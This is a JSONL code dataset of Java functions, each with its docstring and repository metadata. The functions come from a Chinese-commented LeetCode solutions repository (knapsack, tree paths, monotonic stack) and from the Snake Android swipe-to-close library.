{"docstring": "//\u65cb\u8f6c\u6570\u7ec4\u5f88\u597d\u7684\u89e3\u51b3\u65b9\u5f0f\u5c31\u662f\u590d\u5236\u4e00\u4efd\u63a5\u5728\u540e\u9762\n", "func_signal": "public int[] nextGreaterElements(int[] nums)", "code": "{\n    int []big = new int[nums.length];\n    int []newnum = new int[nums.length * 2];\n    Arrays.fill(big, -1);\n    for (int i = 0;i < nums.length;i ++) {\n        newnum[i] = nums[i];\n    }\n    for (int i = nums.length;i < newnum.length;i ++) {\n        newnum[i] = nums[i - nums.length];\n    }\n    for (int i = 0;i < nums.length;i ++) {\n        for (int j = i + 1;j < newnum.length;j ++) {\n            if (newnum[j] > nums[i]) {\n                big[i] = newnum[j];\n                break;\n            }\n        }\n    }\n    return big;\n}", "path": "src\\\u6570\u636e\u7ed3\u6784\\\u6808\u548c\u961f\u5217\\\u5faa\u73af\u6570\u7ec4\u4e2d\u6bd4\u5f53\u524d\u5143\u7d20\u5927\u7684\u4e0b\u4e00\u4e2a\u5143\u7d20.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "//    \u5e73\u65b9\u5e8f\u5217\uff1a1,4,9,16,.. \u95f4\u9694\uff1a3,5,7,...\n//\n//    \u95f4\u9694\u4e3a\u7b49\u5dee\u6570\u5217\uff0c\u4f7f\u7528\u8fd9\u4e2a\u7279\u6027\u53ef\u4ee5\u5f97\u5230\u4ece 1 \u5f00\u59cb\u7684\u5e73\u65b9\u5e8f\u5217\u3002\n//\n//    public boolean isPerfectSquare(int num) {\n//        int subNum = 1;\n//        while (num > 0) {\n//            num -= subNum;\n//            subNum += 2;\n//        }\n//        return num == 0;\n//    }\n", "func_signal": "public boolean isPerfectSquare(int num)", "code": "{\n        if (num == 1 || num == 0)return true;\n        for (int i = 2;i <= num / 2;i ++) {\n            if (i * i == num) {\n                return true;\n            }\n        }\n        return false;\n    }", "path": "src\\\u6570\u5b66\\\u5176\u4ed6\\\u5e73\u65b9\u6570.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "//\u8fd9\u4e2a\u89e3\u6cd5\u7edd\u4e86\u3002\n", "func_signal": "public TreeNode trimBST(TreeNode root, int L, int R)", "code": "{\n    if(root == null) return null;\n    //\u82e5\u6839\u8282\u70b9\u6bd4\u4e0b\u9650\u5c0f\u3002\u53ea\u4fdd\u7559\u53f3\u8fb9\u3002\n    //\u82e5\u6839\u8282\u70b9\u6bd4\u4e0a\u9650\u5927\uff0c\u53ea\u4fdd\u7559\u5de6\u8fb9\u3002\n    if(root.val > R) return trimBST(root.left, L, R);\n    if(root.val < L) return trimBST(root.right, L, R);\n    //\u5982\u679c\u6839\u8282\u70b9\u5728\u4e2d\u95f4\uff0c\u90a3\u4e48\u5de6\u5b50\u6811\u4e5f\u8fdb\u884c\u4ee5\u4e0a\u64cd\u4f5c\u8fdb\u884c\u4fdd\u7559\n    root.left = trimBST(root.left, L, R);\n    root.right = trimBST(root.right, L, R);\n    //\n    return root;\n}", "path": "src\\\u6570\u636e\u7ed3\u6784\\\u6811\\BST\\\u4fee\u526a\u4e8c\u53c9\u67e5\u627e\u6811.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "//\u4ece\u6811\u4e2d\u4efb\u610f\u4e00\u70b9\u51fa\u53d1\uff0c\u627e\u5230\u4e00\u6bb5\u8def\u5f84\u548c\u4e3asum\u5373\u53ef\u3002\n", "func_signal": "public static int pathSum(TreeNode root, int sum)", "code": "{\n    if (root == null)return 0;\n    int cnt = count(root, sum);\n    cnt += pathSum(root.left, sum);\n    cnt += pathSum(root.right, sum);\n    return cnt;\n}", "path": "src\\\u6570\u636e\u7ed3\u6784\\\u6811\\\u9012\u5f52\\\u8def\u5f84\\\u7edf\u8ba1\u8def\u5f84\u548c\u7b49\u4e8e\u4e00\u4e2a\u6570\u7684\u8def\u5f84\u6570\u91cf.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "//\u4ece\u8be5\u8282\u70b9\u5f80\u4e0b\u5bfb\u627e\uff0c\u6ee1\u8db3\u6761\u4ef6\u5373\u53ef\u4ee5++\n", "func_signal": "public static int count(TreeNode root, int sum)", "code": "{\n    if (root == null) return 0;\n    int cnt = 0;\n    if (root.val == sum) cnt ++;\n    cnt += count(root.left, sum - root.val);\n    cnt += count(root.right, sum - root.val);\n    return cnt;\n}", "path": "src\\\u6570\u636e\u7ed3\u6784\\\u6811\\\u9012\u5f52\\\u8def\u5f84\\\u7edf\u8ba1\u8def\u5f84\u548c\u7b49\u4e8e\u4e00\u4e2a\u6570\u7684\u8def\u5f84\u6570\u91cf.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "//\u57fa\u672c\u89e3\u6cd5\n//\u4e09\u91cd\u5faa\u73af\uff0c\u6548\u7387\u4f4e\n", "func_signal": "public int knapsack(int W, int N, int[] weights, int[] values)", "code": "{\n    int[][] dp = new int[N + 1][W + 1];\n    for (int i = 1; i <= N; i++) {\n        int w = weights[i - 1], v = values[i - 1];\n        for (int j = 1; j <= W; j++) {\n            for (int k = 0;k <= j/w;k ++) {\n                if (j >= k * w) {\n                    dp[i][j] = Math.max(dp[i - 1][j], dp[i - 1][j - k * w] + k * v);\n                } else {\n                    dp[i][j] = dp[i - 1][j];\n                }\n            }\n        }\n    }\n    return dp[N][W];\n}", "path": "src\\DP\\\u80cc\u5305\\\u5b8c\u5168\u80cc\u5305.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "//\u5176\u5b9e\u627e\u7684\u662f\u6839\u8282\u70b9\u5230\u53f6\u5b50\u8282\u70b9\u7684\u6700\u5c0f\u8def\u5f84\u503c\n", "func_signal": "public int minDepth(TreeNode root)", "code": "{\n    if (root == null)return 0;\n    int left = minDepth(root.left);\n    int right = minDepth(root.right);\n    //\u5982\u679c\u5de6\u53f3\u5b50\u6811\u6709\u4e00\u4e2a\u4e3a\u7a7a\uff0c\u53ea\u80fd\u53d6\u4e0d\u4e3a\u7a7a\u7684\u957f\u5ea6\n    if (left == 0 || right == 0)return left + right + 1;\n    //\u5982\u679c\u90fd\u4e0d\u4e3a\u7a7a\uff0c\u5219\u53d6\u5c0f\u7684\u90a3\u4e00\u4e2a\u3002\u5999\u554a\n    return Math.min(left,right) + 1;\n\n}", "path": "src\\\u6570\u636e\u7ed3\u6784\\\u6811\\\u9012\u5f52\\\u8def\u5f84\\\u6700\u5c0f\u8def\u5f84.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "//\u4f18\u5316\u6210\u4e00\u7ef4\u540e\u89e3\u6cd5 \u5fc5\u987b\u88c5\u6ee1\n", "func_signal": "public int knapsack3(int W, int N, int[] weights, int[] values)", "code": "{\n    int[]dp = new int[W + 1];\n    Arrays.fill(dp, Integer.MIN_VALUE);\n    dp[0] = 0;\n    for (int i = 1; i <= N; i++) {\n        int w = weights[i - 1], v = values[i - 1];\n        for (int j = w; j <= W; j ++) {\n            if (dp[j - w] != Integer.MIN_VALUE) {\n                dp[j] = Math.max(dp[j], dp[j - w] + v);\n            }\n        }\n    }\n    return dp[W];\n}", "path": "src\\DP\\\u80cc\u5305\\\u5b8c\u5168\u80cc\u5305.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "//\u67e5\u8be2\u6700\u77ed\u8def\u5f84\u65f6\uff0c\u8282\u70b9\u9700\u8981\u4fdd\u5b58\u6b64\u65f6\u7684\u957f\u5ea6\u4fe1\u606f\uff0c\u5426\u5219\u6ca1\u529e\u6cd5\u5f97\u77e5\u957f\u5ea6\u3002\n", "func_signal": "public static void main(String[] args)", "code": "{\n    int [][]a = {{1,1,0,1},\n                 {1,0,1,0},\n                 {1,1,1,1},\n                 {1,0,1,1}};\n    System.out.println(minPathLength(a,3,3));\n}", "path": "src\\BFS\\\u539f\u70b9\u5230\u7279\u5b9a\u70b9\u7684\u6700\u77ed\u8def\u5f84.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "//\u8f6c\u5316\u4e3a01\u80cc\u5305\u7684\u89e3\u6cd5\n//\u5373F[i][j]=F[i][j-C[i]]+W[i]\u3002\u4e3a\u4ec0\u4e48\u4f1a\u662fF[i][j-C[i]]+W[i]\uff1f\n// \u56e0\u4e3a\u6211\u4eec\u524d\u9762\u5df2\u7ecf\u6700\u5927\u9650\u5ea6\u7684\u653e\u4e86\u7b2ci\u4ef6\u7269\u54c1,\u5982\u679c\u80fd\u653e\u5c31\u653e\u8fd9\u6700\u540e\u7684\u4e00\u4ef6,\n//j\u7684\u5faa\u73af\u8981\u6b63\u5e8f\uff0c\u56e0\u4e3a\u5b8c\u5168\u80cc\u5305\u7684\u7b2ci\u4e2a\u7269\u54c1\u51fa\u73b0\u4f1a\u5f71\u54cd\u524d\u9762\u7684\u503c\u3002\n//\u5373\u524d\u9762\u7684\u503c\u9700\u8981\u4fee\u6539\uff0c\u4ee5\u4fbf\u4e8e\u5f71\u54cd\u540e\u9762\u7684\u503c\u3002\n", "func_signal": "public int knapsack03(int W, int N, int[] weights, int[] values)", "code": "{\n    int[][] dp = new int[N + 1][W + 1];\n    for (int i = 1; i <= N; i++) {\n        int w = weights[i - 1], v = values[i - 1];\n        for (int j = w; j <= W; j++) {\n            if (j >= w) {\n                //\u6ce8\u610f\u548c01\u80cc\u5305\u7684\u533a\u522b,\u8fd9\u91cc\u662fdp[i][j-need[i]]+value[i]\n                dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - w] + v);\n            } else {\n                dp[i][j] = dp[i - 1][j];\n            }\n        }\n    }\n    return dp[N][W];\n}", "path": "src\\DP\\\u80cc\u5305\\\u5b8c\u5168\u80cc\u5305.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "// \u4e0d\u60f3\u7528\u6808\n", "func_signal": "public static int[] dailyTemperatures(int[] temperatures)", "code": "{\n    int[]big = new int[temperatures.length];\n    Arrays.fill(big, 0);\n    for (int i = 0;i < temperatures.length - 1;i ++) {\n        for (int j = i + 1;j < temperatures.length;j ++) {\n            if (temperatures[j] > temperatures[i]) {\n                big[i] = j - i;\n                break;\n            }\n        }\n    }\n    return big;\n}", "path": "src\\\u6570\u636e\u7ed3\u6784\\\u6808\u548c\u961f\u5217\\\u6570\u7ec4\u4e2d\u5143\u7d20\u4e0e\u4e0b\u4e00\u4e2a\u6bd4\u5b83\u5927\u7684\u5143\u7d20\u4e4b\u95f4\u7684\u8ddd\u79bb.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "// \u6c42\u533a\u95f4 i ~ j \u7684\u548c\uff0c\u53ef\u4ee5\u8f6c\u6362\u4e3a sum[j] - sum[i-1]\uff0c\u5176\u4e2d sum[i] \u4e3a 0 ~ i \u7684\u548c\u3002\n", "func_signal": "public NumArray(int[] nums)", "code": "{\n    sums = new int[nums.length];\n    for (int i = 0; i < nums.length; i++) {\n        sums[i] = i == 0 ? nums[0] : sums[i - 1] + nums[i];\n    }\n}", "path": "src\\DP\\\u6570\u7ec4\u533a\u95f4\\\u6570\u7ec4\u533a\u95f4\u548c.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "//\u7528\u6808\u7684\u89e3\u6cd5\uff0c\u6ca1\u770b\u61c2\n", "func_signal": "public int[] dailyTemperatures2(int[] temperatures)", "code": "{\n    int n = temperatures.length;\n    int[] ret = new int[n];\n    Stack<Integer> stack = new Stack<>();\n\n    //\u6bcf\u6b21\u538b\u5165\u4e00\u4e2a\u5143\u7d20\uff0c\u5982\u679c\u540e\u9762\u7684\u5143\u7d20\u5927\u4e8e\u6808\u9876\u5143\u7d20\uff0c\u5219\u627e\u5230\u3002\u51fa\u6808\u3002\n    //\u5982\u679c\u4e0d\u6ee1\u8db3\uff0c\u5219\u628a\u5f53\u524d\u5143\u7d20\u4e5f\u538b\u6808\u3002\u91cd\u590d\u591a\u6b21\u540e\u53ef\u80fd\u6709\u591a\u4e2a\u5143\u7d20\u5728\u6808\u5185\u3002\n    //\u5f53\u627e\u5230\u4e00\u4e2a\u6ee1\u8db3\u7684\u5143\u7d20\u65f6\uff0c\u7ee7\u7eed\u5224\u65ad\u4e4b\u524d\u6808\u4e2d\u7684\u5143\u7d20\u662f\u5426\u5c0f\u4e8e\u5b83\u3002\n    //\u82e5\u6ee1\u8db3\u5219\u4e00\u6b21\u53ef\u4ee5\u6807\u8bb0\u591a\u4e2a\u5143\u7d20\u7684\u8ddd\u79bb\u503c\u3002\u8fd9\u6837\u7684\u8bdd\u65f6\u95f4\u590d\u6742\u5ea6\u8981\u4f4e\u5f88\u591a\u3002\n    for(int i = 0; i < n; i++) {\n        while(!stack.isEmpty() && temperatures[i] > temperatures[stack.peek()]) {\n            int idx = stack.pop();\n            ret[idx] = i - idx;\n        }\n        stack.add(i);\n    }\n    return ret;\n}", "path": "src\\\u6570\u636e\u7ed3\u6784\\\u6808\u548c\u961f\u5217\\\u6570\u7ec4\u4e2d\u5143\u7d20\u4e0e\u4e0b\u4e00\u4e2a\u6bd4\u5b83\u5927\u7684\u5143\u7d20\u4e4b\u95f4\u7684\u8ddd\u79bb.java", "repo_name": "h2pl/leetcode", "stars": 683, "license": "None", "language": "java", "size": 196}
{"docstring": "/**\n * Disable fragment's pop animation.\n *\n * @param fragment the specified fragment\n * @param disable disable or enable animation\n */\n", "func_signal": "public static void disableAnimation(android.app.Fragment fragment, boolean disable)", "code": "{\n    if(fragment instanceof SnakeAnimationController) {\n        ((SnakeAnimationController) fragment).disableAnimation(disable);\n    }\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Enable or disable swipe up to home for the specified activity.\n *\n * @param activity the specified activity\n * @param enable true: enable, false: disable\n */\n", "func_signal": "public static void enableSwipeUpToHome(@NonNull Activity activity, boolean enable)", "code": "{\n    if(activity.isFinishing()) return;\n\n    if(enable) {\n        EnableDragToClose enableDragToClose = activity.getClass().getAnnotation(EnableDragToClose.class);\n        if (null == enableDragToClose || !enableDragToClose.value()) {\n            throw new SnakeConfigException(\"If you want to dynamically turn the swipe up to home feature on or off, add the EnableDragToClose annotation to \"\n                    + activity.getClass().getName() + \" and set true.\");\n        }\n    }\n\n    ViewGroup decorView = (ViewGroup) activity.getWindow().getDecorView();\n    View topWindowView = decorView.getChildAt(0);\n\n    if(!(topWindowView instanceof SnakeHackLayout)) {\n        throw new SnakeConfigException(\"Did you enable the keep activities option in the settings? if not, commit issue please\");\n    }\n\n    ((SnakeHackLayout) topWindowView).enableSwipeUpToHome(enable);\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Open DragToClose for activity, just for internal using.\n *\n * @param activity the specified activity\n */\n", "func_signal": "private static void openDragToCloseForActivity(@NonNull final Activity activity)", "code": "{\n    assertActivityDestroyed(activity);\n\n    EnableDragToClose enableDragToClose = activity.getClass().getAnnotation(EnableDragToClose.class);\n    if(null == enableDragToClose || !enableDragToClose.value()) return;\n\n    ViewGroup decorView = (ViewGroup) activity.getWindow().getDecorView();\n    View topWindowView = decorView.getChildAt(0);\n\n    // Just return if top window view was SnakeHackLayout.\n    if(topWindowView instanceof SnakeHackLayout) return;\n\n    // Set transparent background to avoid flashing.\n    activity.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));\n    activity.getWindow().getDecorView().setBackgroundDrawable(null);\n\n    TypedArray a = activity.getTheme().obtainStyledAttributes(new int[] { android.R.attr.windowBackground });\n    int background = a.getResourceId(0, 0);\n    a.recycle();\n    topWindowView.setBackgroundResource(background);\n\n    decorView.removeView(topWindowView);\n\n    final SnakeHackLayout snakeHackLayout = SnakeHackLayout.getLayout(activity, topWindowView, true);\n    decorView.addView(snakeHackLayout);\n\n    SetDragParameter dragParameter = activity.getClass().getAnnotation(SetDragParameter.class);\n    setDragParameter(dragParameter, snakeHackLayout);\n\n    if(Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {\n        snakeHackLayout.setOnlyListenToFastSwipe(true);\n    }\n\n    ActivityDragInterceptor.get(activity).attachToLayout(snakeHackLayout);\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Turn the slide-off function on or off for activity.\n *\n * @param activity the specified activity\n * @param enable true: turn on, false: turn off\n */\n", "func_signal": "public static void enableDragToClose(@NonNull Activity activity, boolean enable)", "code": "{\n    if(activity.isFinishing()) return;\n    EnableDragToClose enableDragToClose = activity.getClass().getAnnotation(EnableDragToClose.class);\n\n    if (null == enableDragToClose) {\n        throw new SnakeConfigException(\"If you want to dynamically turn the slide-off feature on or off, add the EnableDragToClose annotation to \"\n                + activity.getClass().getName() + \" and set to true\");\n    }\n\n    boolean isEnabled = Snake.dragToCloseEnabled(activity);\n\n    if(enable == isEnabled) return;\n\n    ViewGroup decorView = (ViewGroup) activity.getWindow().getDecorView();\n    View topWindowView = decorView.getChildAt(0);\n\n    if(!(topWindowView instanceof SnakeHackLayout)) {\n        throw new SnakeConfigException(\"Did you enable the keep activities option in the settings? if not, commit issue please\");\n    }\n\n    ((SnakeHackLayout) topWindowView).ignoreDragEvent(!enable);\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Add OnDragListener for drag event.\n *\n * @param activity the current activity.\n * @param onDragListener onDragListener\n */\n", "func_signal": "public static void addDragListener(@NonNull Activity activity, Snake.OnDragListener onDragListener)", "code": "{\n    ViewGroup decorView = (ViewGroup) activity.getWindow().getDecorView();\n    if(!(decorView.getChildAt(0) instanceof SnakeHackLayout) || null == onDragListener) return;\n\n    ((SnakeHackLayout)decorView.getChildAt(0)).addOnDragListener(onDragListener);\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Set custom touch interceptor for fragment.\n *\n * @param fragment the specified fragment.\n * @param interceptor the custom touch interceptor.\n */\n", "func_signal": "public static void setCustomTouchInterceptor(@NonNull android.app.Fragment fragment, SnakeTouchInterceptor interceptor)", "code": "{\n    if(fragment instanceof com.youngfeng.snake.app.Fragment) {\n        ((Fragment) fragment).setCustomTouchInterceptor(interceptor);\n    } else {\n        try {\n            Method method = fragment.getClass().getMethod(\"setCustomTouchInterceptor\", SnakeTouchInterceptor.class);\n            method.invoke(fragment, interceptor);\n        } catch (Throwable e) {\n            e.printStackTrace();\n        }\n    }\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Initializes snake with default configurations, it will find configuration file in asset/snake.xml,\n * Snake will use default configruation if not found snake.xml.\n *\n * @param application application instance\n */\n", "func_signal": "public static void init(Application application)", "code": "{\n    application.registerActivityLifecycleCallbacks(new GlobalActivityLifecycleDelegate() {\n        @Override\n        public void onActivityCreated(Activity activity, Bundle savedInstanceState) {\n            ActivityManager.get().put(activity);\n            openDragToCloseForActivity(activity);\n            Logger.d(activity.getClass() + \" onCreate completed...\");\n        }\n\n        @Override\n        public void onActivityDestroyed(Activity activity) {\n            ActivityManager.get().remove(activity);\n            Logger.d(activity.getClass() + \" destoryed completed...\");\n        }\n    });\n    SnakeConfigReader.get().init(application);\n    mContext = application;\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Wrap fragment animator to simplify use.\n *\n * @param superAnimator the result of call super onCreateAnimator\n * @param animationController the interface of control fragment's animator\n *\n * @return the fragment animator\n */\n", "func_signal": "public static Animator wrap(@Nullable Animator superAnimator, @NonNull SnakeAnimationController animationController)", "code": "{\n    if(animationController.animationDisabled()) return AnimationFactory.emptyAnimator();\n    return superAnimator;\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Get enable state of the swipe up to home feature.\n *\n * @param fragment the specified fragment\n *\n * @return true: enable, false: disable\n */\n", "func_signal": "@Deprecated\npublic static boolean swipeUpToHomeEnabled(@NonNull android.app.Fragment fragment)", "code": "{\n    View contentView = fragment.getView();\n\n    if(contentView instanceof SnakeHackLayout) {\n        return ((SnakeHackLayout) contentView).swipeUpToHomeEnabled();\n    }\n\n    return false;\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Disable fragment's pop animation.\n *\n * @param fragment the specified support fragment\n * @param disable disable or enable animation\n */\n", "func_signal": "public static void disableAnimation(androidx.fragment.app.Fragment fragment, boolean disable)", "code": "{\n    if(fragment instanceof SnakeAnimationController) {\n        ((SnakeAnimationController) fragment).disableAnimation(disable);\n    }\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Create a support fragment proxy object using the specified constructor.\n * It will be use the empty parameter constructor if not specify the primaryconstructor annotation\n * in constructor.\n *\n * @param fragment specified support fragment class\n * @param args specified constructor parameters\n * @param <T> the child classes of android.support.v4.app.fragment.\n *\n * @return support fragment proxy object\n */\n", "func_signal": "public static <T extends androidx.fragment.app.Fragment> T newProxySupport(Class<? extends T> fragment, Object... args)", "code": "{\n    checkAnnotationNotEmpty(fragment);\n\n    try {\n        String className = fragment.getName() + \"_SnakeProxy\";\n        if(com.youngfeng.snake.androidx.app.Fragment.class.isAssignableFrom(fragment)) {\n            className = fragment.getName();\n        }\n        Class<?> snakeProxyClass = Class.forName(className);\n        Constructor<?>[] constructors = snakeProxyClass.getConstructors();\n\n        Constructor<?> primaryConstructor = null;\n\n        for (Constructor<?> constructor : constructors) {\n            PrimaryConstructor primaryConstructorAnno = constructor.getAnnotation(PrimaryConstructor.class);\n            if(null != primaryConstructorAnno) {\n                primaryConstructor = constructor;\n                break;\n            }\n        }\n\n        T result = null;\n        if(null != primaryConstructor) {\n            result = (T) primaryConstructor.newInstance(args);\n        } else {\n            result = (T) snakeProxyClass.newInstance();\n        }\n\n        return result;\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n\n    return null;\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Return back to home.\n */\n", "func_signal": "public static void backToHome(Context context)", "code": "{\n    try {\n        Intent intent = new Intent(Intent.ACTION_MAIN);\n        intent.addCategory(Intent.CATEGORY_HOME);\n        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n        context.startActivity(intent);\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\util\\Utils.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Open DragToClose for fragment, just for internal using.\n *\n * @param snakeHackLayout SnakeHackLayout\n * @param fragment the current fragment\n */\n", "func_signal": "public static void openDragToCloseForFragment(@NonNull SnakeHackLayout snakeHackLayout, @NonNull final androidx.fragment.app.Fragment fragment)", "code": "{\n    assertFragmentActive(fragment);\n\n    setDragParameter(fragment.getClass().getAnnotation(SetDragParameter.class), snakeHackLayout);\n\n    final FragmentManagerHelper fragmentManagerHelper = FragmentManagerHelper.get(fragment.getFragmentManager());\n    snakeHackLayout.setOnEdgeDragListener(new SnakeHackLayout.OnEdgeDragListener() {\n        private androidx.fragment.app.Fragment lastFragment;\n\n        @Override\n        public void onDragStart(SnakeHackLayout parent) {\n            SoftKeyboardHelper.hideKeyboard(fragment);\n        }\n\n        @Override\n        public void onDrag(SnakeHackLayout parent, View view, int left) {\n            if (null == lastFragment) lastFragment = fragmentManagerHelper.getLastAndroidXFragment(fragment);\n            if (null == lastFragment) return;\n            if (lastFragment.isDetached() || lastFragment.isRemoving()) return;\n\n            View viewOfLastFragment = lastFragment.getView();\n\n            if (null != viewOfLastFragment) {\n                if (View.VISIBLE != viewOfLastFragment.getVisibility()) {\n                    viewOfLastFragment.setVisibility(View.VISIBLE);\n                }\n\n                View contentView = viewOfLastFragment;\n                if (viewOfLastFragment instanceof SnakeHackLayout) {\n                    contentView = ((SnakeHackLayout) viewOfLastFragment).getContentView();\n                }\n\n                if(parent.getUIConfig().allowPageLinkage) {\n                    float ratio = (left * 1.0f) / parent.getWidth();\n\n                    float offsetLeft = (ratio - 1) * Utils.dp2px(fragment.requireActivity(), 100f);\n                    contentView.setLeft((int)offsetLeft);\n                }\n            }\n        }\n\n        @Override\n        public void onRelease(SnakeHackLayout parent, View view, int left, final boolean shouldClose, int interceptScene) {\n            if(shouldClose) {\n                disableAnimation(lastFragment, true);\n\n                parent.smoothScrollToLeave(view, new SnakeHackLayout.OnReleaseStateListener() {\n                    @Override\n                    public void onReleaseCompleted(SnakeHackLayout parent, View view) {\n                        if (null == lastFragment) lastFragment = fragmentManagerHelper.getLastAndroidXFragment(fragment);\n                        if (null == lastFragment) return;\n\n                        View viewOfLastFragment = lastFragment.getView();\n                        resetContentViewForFragment(viewOfLastFragment);\n\n                        fragmentManagerHelper.backToAndroidXFragment();\n                        disableAnimation(lastFragment, false);\n                    }\n                });\n            } else {\n                parent.smoothScrollToStart(view, new SnakeHackLayout.OnReleaseStateListener() {\n                    @SuppressLint(\"WrongConstant\")\n                    @Override\n                    public void onReleaseCompleted(SnakeHackLayout parent, View view) {\n                        if (null == lastFragment) lastFragment = fragmentManagerHelper.getLastAndroidXFragment(fragment);\n                        if (null == lastFragment) return;\n\n                        View viewOfLastFragment = lastFragment.getView();\n\n                        if(null != viewOfLastFragment) {\n                            resetContentViewForFragment(viewOfLastFragment);\n                        }\n                    }\n                });\n            }\n        }\n    });\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Set custom touch interceptor for activity.\n *\n * @param activity the specified activity.\n * @param interceptor the custom touch interceptor.\n */\n", "func_signal": "public static void setCustomTouchInterceptor(@NonNull Activity activity, SnakeTouchInterceptor interceptor)", "code": "{\n    if(activity.isFinishing() || null == interceptor) return;\n\n    ViewGroup decorView = (ViewGroup) activity.getWindow().getDecorView();\n    if(!(decorView.getChildAt(0) instanceof SnakeHackLayout)) return;\n\n    SnakeHackLayout snakeHackLayout = (SnakeHackLayout) decorView.getChildAt(0);\n    snakeHackLayout.setCustomTouchInterceptor(interceptor);\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "// Asset annotation EnableDragToClose not empty\n", "func_signal": "private static void checkAnnotationNotEmpty(Class<?> clazz)", "code": "{\n    if(clazz.getAnnotation(EnableDragToClose.class) == null) {\n        throw new IllegalStateException(String.format(\"Please add %s annotation to class %s first,  eg: @%s.\",\n                EnableDragToClose.class.getName(), clazz.getName(), EnableDragToClose.class.getSimpleName()));\n    }\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
{"docstring": "/**\n * Enable or disable swipe up to home for the specified support fragment.\n *\n * @param fragment the specified support fragment\n * @param enable true: enable, false: disable\n */\n", "func_signal": "@Deprecated\npublic static void enableSwipeUpToHome(@NonNull androidx.fragment.app.Fragment fragment, boolean enable)", "code": "{\n    if(fragment instanceof com.youngfeng.snake.androidx.app.Fragment) {\n        ((com.youngfeng.snake.androidx.app.Fragment) fragment).enableSwipeUpToHome(enable);\n    } else {\n        try {\n            Method method = fragment.getClass().getMethod(\"enableSwipeUpToHome\", Boolean.class);\n            method.invoke(fragment, enable);\n        } catch (Throwable e) {\n            if (e instanceof NoSuchMethodException) {\n                throw new SnakeConfigException(\"Please use Snake.newProxySupport create a Fragment instance\");\n            } else {\n                e.printStackTrace();\n            }\n        }\n    }\n}", "path": "snake\\src\\main\\java\\com\\youngfeng\\snake\\Snake.java", "repo_name": "yuanhoujun/Snake", "stars": 614, "license": "apache-2.0", "language": "java", "size": 6710}
